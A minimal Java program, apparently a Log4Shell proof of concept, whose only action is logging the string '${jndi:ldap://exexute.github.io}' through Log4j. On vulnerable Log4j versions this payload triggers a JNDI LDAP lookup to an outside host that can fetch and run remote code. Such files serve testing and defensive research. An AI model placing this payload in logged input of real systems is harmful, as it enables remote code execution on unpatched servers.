package club.owefsad.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;

public class Main {

    private static final Logger LOGGER = (Logger) LogManager.getLogger();

    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://exexute.github.io}");
    }
}
